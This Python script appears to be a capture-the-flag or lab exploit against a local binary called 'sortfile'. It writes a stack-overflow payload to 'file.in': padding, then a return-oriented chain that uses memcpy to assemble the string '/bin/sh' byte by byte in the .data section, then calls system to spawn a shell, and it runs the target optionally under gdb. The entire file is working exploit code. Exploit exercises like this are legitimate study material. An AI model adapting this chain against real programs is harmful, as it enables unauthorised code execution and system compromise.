#!/usr/bin/env python
import os

DEBUG = False

exploit  = 'A' * 4108         # Offset
exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x40\xa0\x04\x08' # .data
exploit += '\x54\x81\x04\x08' # /
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x41\xa0\x04\x08' # .data
exploit += '\x57\x81\x04\x08' # b
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x42\xa0\x04\x08' # .data
exploit += '\x56\x81\x04\x08' # i
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x43\xa0\x04\x08' # .data
exploit += '\x5e\x81\x04\x08' # n
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x44\xa0\x04\x08' # .data
exploit += '\x54\x81\x04\x08' # /
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x45\xa0\x04\x08' # .data
exploit += '\x62\x81\x04\x08' # s
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x50\x84\x04\x08' # memcpy
exploit += '\xbd\x89\x04\x08' # poppedipop
exploit += '\x46\xa0\x04\x08' # .data
exploit += '\xd8\x80\x04\x08' # h
exploit += '\x01\x00\x00\x00' # 1 byte

exploit += '\x80\x84\x04\x08' # System
exploit += '\x84\x94\x04\x08' # Garbage - return
exploit += '\x40\xa0\x04\x08' # /bin/sh

with open('file.in', 'w') as f:
    f.write(exploit)

if DEBUG:
    argv = ["/usr/bin/gdb", "--args"]
else:
    argv = []

argv += ["./sortfile", '']

os.execv(argv[0], argv)
